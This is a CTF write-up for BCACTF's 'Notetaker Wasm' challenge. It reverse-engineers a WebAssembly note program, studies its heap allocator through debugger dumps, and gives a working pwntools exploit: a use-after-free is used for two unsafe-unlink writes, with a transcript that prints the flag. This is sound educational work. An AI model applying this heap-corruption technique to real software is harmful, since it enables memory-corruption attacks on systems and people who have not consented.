--- 
layout: post 
title:  "[BCACTF] Notetaker Wasm"
date: "2022-5-6" 
categories: [Pwn, Unsafe-Unlink, Wasm]
author: eurus 
---

Challenge description: 'Just another heap notetaker challenge - compiled to wasm.'
The author provided us with the file challenge.wasm.

## Plan
- find that ghidra has a [plugin from nneonneo](https://github.com/nneonneo/ghidra-wasm-plugin/) for wasm files.
- find the switch to win the challenge (write 'fL4g' at 0x005016e8)
- use gdb and wasmtime to perform some dynamic analisys to understand how the heap is implemented
- unsafe unlink 2 times to write 'fL4g'
- win the challenge ``` bcactf{e8f73a0ebcd82fcce8a} ```

## Intro

I have used a [plugin from nneonneo](https://github.com/nneonneo/ghidra-wasm-plugin/).
Here there is some decompiled code with the function renamed since the file does not contain any symbols.

Let's see what this program does:

```
]=======[ MENU ]=======[
] 1) Print a note      [
] 2) Delete note       [
] 3) Create a note     [
] 4) Write to a note   [
]======================[
Please choose an option (1, 2, 3, 4)
```
Above we can see what the program can do, and below there is the main function that will contain the function for printing the menu 
and handle the choices of the user.
```c
undefined4 main-ish(void)

{
  int selection;
  
  while( true ) {
    while( true ) {
      while( true ) {
        while( true ) {
          if (false) {
            win();
            return 0;
          }
          selection = printmenu_ret_selection();
          if (selection != 0) break;
          print_note();
        }
        if (selection != 1) break;
        delete_note();
      }
      if (selection != 2) break;
      create_note();
    }
    if (selection != 3) break;
    write_note();
  }
  puts-ish(s_Invalid_option_ram_00000460);
  return 0;
}
```

we can see that there is a function that I have renamed win because will print the flag, below the decompiled code.

```c
void win(void)
{
  //    ram:00000400 ds "bcactf{not_the_actual_flag}"
  puts-ish(0x400);
  return;
}
```

so we need to run this function, but from the decompiled code it seems that it will not be called no matter what, but by analyzing the
main wasm code we can see that is not true. That function will be called oly if at the address 0x005016e8 will be present the string 'fL4g'
here the wasm code where this behavior is defined.
``` 
                            global_0 
     al:00000000            undefined4 005016F0h

                             main-ish 
    ram:8000085c   0        .locals
    ram:8000085d   0        .local     count=0x14 type=0x7f
    ram:8000085f   0        global.get global_0 ## = 005016F0h
    ram:80000861   0        local.set  l0
    ram:80000863   0        i32.const  0x10
    ram:80000865   0        local.set  l1
    ram:80000867   0        local.get  l0
    ram:80000869   0        local.get  l1
    ram:8000086b   0        i32.sub
    ram:8000086c   0        local.set  l2 #### l2 = l0-l1 = global_0 - 0x10 = 005016E0
    ram:8000086e   0        local.get  l2
    ram:80000870   0        global.set global_0 ## global_0 = l2 = 5016E0
........................................................
                             LAB_ram_8000088a           
    ram:8000088a 010        loop       blocktype=0x40
    ram:8000088c 010        local.get  l2
    ram:8000088e 010        i32.load   align=0x2 offset=0x8
    ram:80000891 010        local.set  l5 ### l5 = load(base=l2, offset=0x8) = 5016E0 + 8
    ram:80000893 010        i32.const  0x67344c66 ##### fL4g
    ram:80000899 010        local.set  l6
    ram:8000089b 010        local.get  l5
    ram:8000089d 010        local.set  l7 #### l7 = l5 = load from 5016E08
    ram:8000089f 010        local.get  l6
    ram:800008a1 010        local.set  l8 #### l8 = l6 =  0x67344c66 = fL4g
    ram:800008a3 010        local.get  l7
    ram:800008a5 010        local.get  l8
    ram:800008a7 010        i32.eq
    ram:800008a8 010        local.set  l9 #### l9 = eq(l8,l7) = eq('fL4g', *5016E08)
    ram:800008aa 010        i32.const  0x1
    ram:800008ac 010        local.set  l10 ### l10 = 1
    ram:800008ae 010        local.get  l9
    ram:800008b0 010        local.get  l10
    ram:800008b2 010        i32.and    ######## win only if l10 and l9 !=0
    ram:800008b3 010        local.set  l11
    ram:800008b5 010        block      blocktype=0x40
    ram:800008b7 010        local.get  l11
    ram:800008b9 010        i32.eqz    ######## win only if l11 != 0
    ram:800008ba 010        br_if      LAB_ram_800008cb
    ram:800008bc 010        call       win  ###################### WIN
```

So really fast plan we need to write 'fL4g' at 5016E08, so we need to have an arbitrary write primitive in some way.

## Heap reseach
WebAssembly (wasm) is a 32-bit stack-based virtual machine for usage in browsers. Executable, stack (grows to 0), heap (grows from 0)is  the most common wasm memory layout.
and there are no ASLR, no write protection, and no execute protection over the memory.

```
pwndbg> dd 0x7ffe705016f0 20
00007ffe705016f0     00000000 0000001b 41414141 41414141
00007ffe70501700     41414141 00414141 00000000 0000001b
00007ffe70501710     42424242 42424242 42424242 00424242
00007ffe70501720     00000000 0000001b 43434343 43434343
00007ffe70501730     43434343 00434343 00000000 000018a1
```
here we can see the heap with the allocated three notes of size 0x10 bytes, we can see that before the user data he have 
8 bytes that contains the sixe of the allocate chunk, (I think that was 4 byte for the prev size and 4 for the sise and flags).

```
This is the heap with 6 notes allocated and the 1st,3rd,5th deleted.

pwndbg> dd 0x7ffe705016f0 40
00007ffe705016f0     00000000 00000019 0000153c 00501720
00007ffe70501700     41414141 00414141 00000018 0000001a
00007ffe70501710     42424242 42424242 42424242 00424242
00007ffe70501720     00000000 00000019 005016f0 00501750
00007ffe70501730     43434343 00434343 00000018 0000001a
00007ffe70501740     00000000 00000000 00000000 00000000
00007ffe70501750     00000000 00000019 00501720 0000153c
00007ffe70501760     00000000 00000000 00000018 0000001a
00007ffe70501770     00000000 00000000 00000000 00000000
00007ffe70501780     00000000 00001859 00000000 00000000

This is the heap with 6 notes allocated and the 1st, 2nd, 3rd,5th, 6th deleted.

pwndbg> dd 0x7ffe705016f0 40
00007ffe705016f0     00000000 00000049 0000156c 0000156c
00007ffe70501700     41414141 00414141 00000018 0000001a
00007ffe70501710     42424242 42424242 42424242 00424242
00007ffe70501720     00000000 00000019 0000153c 00501750
00007ffe70501730     43434343 00434343 00000048 0000001a
00007ffe70501740     00000000 00000000 00000000 00000000
00007ffe70501750     00000000 00001889 0000153c 0000153c
00007ffe70501760     00000000 00000000 00000018 0000001a
00007ffe70501770     00000000 00000000 00000000 00000000
00007ffe70501780     00000000 00001859 00000000 00000000
```
we can see that the chunk after the free is arranged like this:
```
|4Bytes|  4Bytes  |4Bytes|4Bytes|
|      |size flags|  bk  |  fd  |
| data |   data   | data | data |
```
so is a circular doubly linked list. And we can also see that the freed chunk near the top chunk are consolidated into it,
and also chunks that are not near the top chunk, but that also freed chunks that have another freed chunk next to them 
are consolidated with each other (see 1st and 2nd and 3rd) and are moved into another circular doubly linked list.

So if is possible a unsafe unlink if we can taamper the heap metadata saved into a chunk after the free we can write and win the challenge.
Lukly for us this is possible, since in order to maintain small size of code for the wasm library some checks are not performed.

And since we have a ```UAF``` (the program never null the pointer freed so after the free we can always write into the note)
we can tamper chunk metadata and perform an unsafe unlink in order to write data wherever we want.

This is possible because, since the consolidated chunk need to be moved from one list to another 
(From the list associated with one chunk size to another with another chunk size) the removed chunk need to be 
``` unlinked ``` from one list and so his ``` bk ``` pointer need to be write into the ``` fd->bk ``` value and 
his ``` fd ``` pointer need to be written into the ``` bk->fd ``` value
and so we have an arbitrary write primitive. The only think is that we need to write two time because there is a check for the 
value since we write in both direction what we write need also to be a valid address, so I wasn't able to write all fL4g in
one time but I have exploited two unsafe unlink in order to write fL4g at 0x005016e8

## Exploit

```python
from pwn import *

def print_note(i):
	p.sendlineafter(b'Please choose an option (1, 2, 3, 4)\n',b'1')
	p.sendlineafter(b'Please choose a note (1 to 8 inclusive)\n',f'{i}'.encode())
	p.recvuntil(b'Printing note\n\n')
	res = p.resvuntilS(']=======[ MENU ]=======[\n').replace(']=======[ MENU ]=======[\n','')
	return res

def delete(i):
	p.sendlineafter(b'Please choose an option (1, 2, 3, 4)\n',b'2')
	p.sendlineafter(b'Please choose a note (1 to 8 inclusive)\n',f'{i}'.encode())	

def create_note(i):
	p.sendlineafter(b'Please choose an option (1, 2, 3, 4)\n',b'3')
	p.sendlineafter(b'Please choose a note (1 to 8 inclusive)\n',f'{i}'.encode())	

def write_note(i, data):
	p.sendlineafter(b'Please choose an option (1, 2, 3, 4)\n',b'4')
	p.sendlineafter(b'Please choose a note (1 to 8 inclusive)\n',f'{i}'.encode())
  p.sendlineafter(f'Send note content for note'.encode(),data)

#p = process(argv=["/home/eurus/.wasmtime/bin/wasmtime",'run','-g','chall.wasm'])
#gdb.attach(p)
p=remote('bin.bcactf.com', 49180) 

# arrange the heap to exploit two unsafe unlink
create_note(1)
create_note(2)
create_note(2)
create_note(3)
create_note(4)
create_note(4)
create_note(5)
create_note(6)
create_note(6)
create_note(7)

delete(1)
delete(2)
delete(4)
delete(6)

# exploit UAF to tamper with heap metadata
write_note(2,b'AAAA\xe0\x16\x50')
write_note(2,b'AAA') # use for null byte at the end
write_note(2,b'fL') #

write_note(4,b'AAAA\xe2\x16\x50')
write_note(4,b'AAA') # use for null byte at the end
write_note(4,b'4g')

#cause unlink 2 and 4 
delete(3)
delete(5)

p.interactive()
'''
eurus@CTF:~/Scaricati/bcactf-2022/pwn_notetaker-wasm$ python3 solver.py
[+] Opening connection to bin.bcactf.com on port 49180: Done
[*] Switching to interactive mode
Note has been deleted
bcactf{e8f73a0ebcd82fcce8a}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to bin.bcactf.com port 49180
'''
```

